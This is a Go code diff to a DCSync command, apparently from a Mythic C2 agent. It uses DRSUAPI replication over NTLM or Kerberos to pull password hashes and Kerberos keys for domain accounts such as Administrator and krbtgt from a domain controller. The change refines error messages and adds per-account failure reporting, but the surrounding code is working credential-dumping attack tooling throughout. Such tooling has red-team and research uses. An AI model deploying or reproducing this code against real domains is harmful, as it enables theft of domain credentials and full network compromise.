@@ -50,11 +50,12 @@ type dcsyncResult struct {
 	PasswordLastSet         string
 	UserAccountControl      uint32
 	SupplementalCredentials []string // additional kerberos keys
+	Error                   string   `json:"error,omitempty"`
 }
 
 func (c *DcsyncCommand) Execute(task structs.Task) structs.CommandResult {
 	if task.Params == "" {
-		return errorResult("Error: parameters required. Use -server <DC> -username <user> -password <pass> -target <account>")
+		return errorResult("parameters required. Use -server <DC> -username <user> -password <pass> -target <account>")
 	}
 
 	args, parseErr := unmarshalParams[dcsyncArgs](task)
@@ -63,11 +64,11 @@ func (c *DcsyncCommand) Execute(task structs.Task) structs.CommandResult {
 	}
 
 	if args.Server == "" || args.Username == "" || (args.Password == "" && args.Hash == "") {
-		return errorResult("Error: server, username, and password (or hash) are required")
+		return errorResult("server, username, and password (or hash) are required")
 	}
 
 	if args.Target == "" {
-		return errorResult("Error: target account(s) required. Use -target Administrator or -target \"admin,krbtgt\"")
+		return errorResult("target account(s) required. Use -target Administrator or -target \"admin,krbtgt\"")
 	}
 
 	if args.Timeout <= 0 {
@@ -95,15 +96,15 @@ func (c *DcsyncCommand) Execute(task structs.Task) structs.CommandResult {
 	}
 
 	if len(targets) == 0 {
-		return errorResult("Error: no valid target accounts specified")
+		return errorResult("no valid target accounts specified")
 	}
 
 	useKerberos := strings.EqualFold(args.Auth, "kerberos") || strings.EqualFold(args.Auth, "krb5")
 	if useKerberos && args.DCHost == "" {
-		return errorResult("Error: dc_host (DC FQDN) is required for Kerberos auth (e.g. dc01.domain.local)")
+		return errorResult("dc_host (DC FQDN) is required for Kerberos auth (e.g. dc01.domain.local)")
 	}
 	if useKerberos && args.Domain == "" {
-		return errorResult("Error: domain is required for Kerberos auth")
+		return errorResult("domain is required for Kerberos auth")
 	}
 
 	if !useKerberos {
@@ -116,7 +117,7 @@ func dcsyncExecuteNTLM(args dcsyncArgs, targets []string) structs.CommandResult 
 	results, err := dcsyncViaSubprocess(args, targets)
 	zeroCredentials(&args.Password, &args.Hash)
 	if err != nil {
-		return errorf("Error: %v", err)
+		return errorf("DCSync replication via NTLM against %s failed: %v", args.Server, err)
 	}
 	return dcsyncFormatResults(args, targets, results, "NTLM")
 }
@@ -127,7 +128,7 @@ func dcsyncExecuteKerberos(args dcsyncArgs, targets []string) structs.CommandRes
 	cred, credErr = rpcKerberosCredential(args.Username, args.Domain, args.Password, args.Hash)
 	zeroCredentials(&args.Password, &args.Hash)
 	if credErr != nil {
-		return errorf("Error: %v", credErr)
+		return errorf("Kerberos credential setup failed for %s@%s targeting %s: %v", args.Username, args.Domain, args.Server, credErr)
 	}
 
 	timeout := time.Duration(args.Timeout) * time.Second
@@ -144,7 +145,7 @@ func dcsyncExecuteKerberos(args dcsyncArgs, targets []string) structs.CommandRes
 		),
 	)
 	if err != nil {
-		return errorf("Error connecting to %s via DCE-RPC: %v", args.Server, err)
+		return errorf("connecting to %s via DCE-RPC: %v", args.Server, err)
 	}
 	defer cc.Close(ctx)
 
@@ -154,7 +155,7 @@ func dcsyncExecuteKerberos(args dcsyncArgs, targets []string) structs.CommandRes
 		dcerpc.WithSecurityConfig(krbCfg),
 	)
 	if err != nil {
-		return errorf("Error creating DRSUAPI client: %v", err)
+		return errorf("creating DRSUAPI client: %v", err)
 	}
 
 	clientCaps := drsuapi.ExtensionsInt{
@@ -163,14 +164,14 @@ func dcsyncExecuteKerberos(args dcsyncArgs, targets []string) structs.CommandRes
 	}
 	capsBytes, err := ndr.Marshal(&clientCaps, ndr.Opaque)
 	if err != nil {
-		return errorf("Error marshaling client capabilities: %v", err)
+		return errorf("marshaling client capabilities: %v", err)
 	}
 
 	bindResp, err := cli.Bind(ctx, &drsuapi.BindRequest{
 		Client: &drsuapi.Extensions{Data: capsBytes},
 	})
 	if err != nil {
-		return errorf("Error DRSBind to %s: %v", args.Server, err)
+		return errorf("DRSBind to %s: %v", args.Server, err)
 	}
 
 	var crackFormat uint32
@@ -200,17 +201,21 @@ func dcsyncExecuteKerberos(args dcsyncArgs, targets []string) structs.CommandRes
 		},
 	})
 	if err != nil {
-		return errorf("Error DRSCrackNames: %v", err)
+		return errorf("DRSCrackNames: %v", err)
 	}
 
 	crackedReply, ok := cracked.Out.GetValue().(*drsuapi.MessageCrackNamesReplyV1)
 	if !ok || crackedReply == nil {
-		return errorResult("Error: unexpected DRSCrackNames response type")
+		return errorResult("unexpected DRSCrackNames response type")
 	}
 
 	var results []dcsyncResult
 	for i, item := range crackedReply.Result.Items {
 		if item.Status != 0 {
+			results = append(results, dcsyncResult{
+				Username: targets[i],
+				Error:    fmt.Sprintf("CrackNames failed: status %d", item.Status),
+			})
 			continue
 		}
 		nc, err := cli.GetNCChanges(ctx, &drsuapi.GetNCChangesRequest{
@@ -230,6 +235,10 @@ func dcsyncExecuteKerberos(args dcsyncArgs, targets []string) structs.CommandRes
 			},
 		})
 		if err != nil {
+			results = append(results, dcsyncResult{
+				Username: targets[i],
+				Error:    fmt.Sprintf("GetNCChanges failed: %v", err),
+			})
 			continue
 		}
 		if r := dcsyncParseReply(cli, nc, targets[i]); r != nil {
@@ -247,7 +256,13 @@ func dcsyncFormatResults(args dcsyncArgs, targets []string, results []dcsyncResu
 	sb.WriteString(strings.Repeat("-", 60) + "\n")
 
 	var creds []structs.MythicCredential
+	var successCount int
 	for _, result := range results {
+		if result.Error != "" {
+			sb.WriteString(fmt.Sprintf("\n[-] %s: %s\n", result.Username, result.Error))
+			continue
+		}
+		successCount++
 		sb.WriteString(fmt.Sprintf("\n[+] %s (RID: %d)\n", result.Username, result.RID))
 		if result.NTHash != "" {
 			sb.WriteString(fmt.Sprintf("    NTLM:   %s\n", result.NTHash))
@@ -282,11 +297,21 @@ func dcsyncFormatResults(args dcsyncArgs, targets []string, results []dcsyncResu
 		}
 	}
 
-	sb.WriteString(fmt.Sprintf("\n[*] %d/%d accounts dumped successfully\n", len(results), len(targets)))
+	failCount := len(results) - successCount
+	if failCount > 0 {
+		sb.WriteString(fmt.Sprintf("\n[*] %d/%d accounts dumped, %d failed\n", successCount, len(targets), failCount))
+	} else {
+		sb.WriteString(fmt.Sprintf("\n[*] %d/%d accounts dumped successfully\n", successCount, len(targets)))
+	}
+
+	status := "success"
+	if successCount == 0 && len(targets) > 0 {
+		status = "error"
+	}
 
 	cmdResult := structs.CommandResult{
 		Output:    sb.String(),
-		Status:    "success",
+		Status:    status,
 		Completed: true,
 	}
 	if len(creds) > 0 {
